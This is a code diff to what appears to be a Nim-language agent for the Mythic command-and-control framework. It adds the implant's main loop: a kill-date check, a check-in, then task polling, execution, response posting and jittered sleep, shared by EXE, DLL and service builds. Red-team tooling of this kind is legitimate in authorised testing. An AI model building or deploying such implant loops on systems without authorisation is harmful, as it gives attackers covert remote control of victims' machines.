@@ -1,4 +1,4 @@
-import std/[json, random, os, base64, tables, strformat]
+import std/[json, random, os, base64, tables, strformat, times]
 import config
 import profiles/http_profile
 import utils/sysinfo
@@ -677,5 +677,39 @@ proc sleep*(agent: Agent) =
       os.sleep(sleepTime * 1000)
   else:
     os.sleep(sleepTime * 1000)
+
+proc runAgent*() =
+  ## Main agent execution loop - called by all entry points (EXE, DLL, Service)
+  ## This is the single source of truth for the agent's main loop logic
+  
+  # Initialize random number generator for jitter
+  randomize()
+  
+  # Check killdate
+  let cfg = getConfig()
+  let now = now().format("yyyy-MM-dd")
+  if now >= cfg.killdate:
+    return
+  
+  # Initialize agent
+  var agentInstance = newAgent()
+  
+  # Perform initial checkin
+  if not agentInstance.checkin():
+    return
+  
+  # Main agent loop
+  while not agentInstance.shouldExit:
+    # Get tasking from Mythic
+    let tasks = agentInstance.getTasks()
+    
+    # Process tasks
+    agentInstance.processTasks(tasks)
+    
+    # Send responses back (handles background task state machine)
+    agentInstance.postResponses()
+    
+    # Sleep with jitter
+    agentInstance.sleep()
 
 
